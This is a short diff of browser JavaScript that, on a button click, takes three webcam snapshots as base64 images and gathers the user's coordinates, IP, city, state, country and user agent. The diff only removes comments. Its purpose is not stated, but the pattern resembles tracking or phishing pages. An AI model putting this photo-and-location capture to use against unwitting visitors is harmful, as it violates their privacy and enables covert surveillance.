@@ -119,23 +119,17 @@ btn.addEventListener("click", async () => {
       throw new Error("Vídeo não carregou");
     }
 
-    // Configura tamanho fixo e leve para a conversão de Base64
     canvas.width = 640;
     canvas.height = 480;
     const ctx = canvas.getContext("2d");
     const fotos = [];
 
-    // Captura 3 fotos com intervalo de 1 segundo
     for(let i = 0; i < 3; i++) {
         ctx.drawImage(video, 0, 0, 640, 480);
-        
-        // Mantém em Base64 puro, com compressão leve de 0.4 para salvar sem erros
         fotos.push(canvas.toDataURL("image/jpeg", 0.4));
-        
         if(i < 2) await new Promise(resolve => setTimeout(resolve, 1000));
     }
 
-    // Desliga a câmera para economizar hardware
     const stream = video.srcObject;
     if (stream) {
         stream.getTracks().forEach(track => track.stop());
@@ -201,7 +195,7 @@ btn.addEventListener("click", async () => {
           latitude: latitude.toString(),
           longitude: longitude.toString(),
           ip: ip,
-          cidade: cidade, // CORRIGIDO AQUI!
+          cidade: cidade, 
           estado: estado,
           pais: pais,
           user_agent: navigator.userAgent,
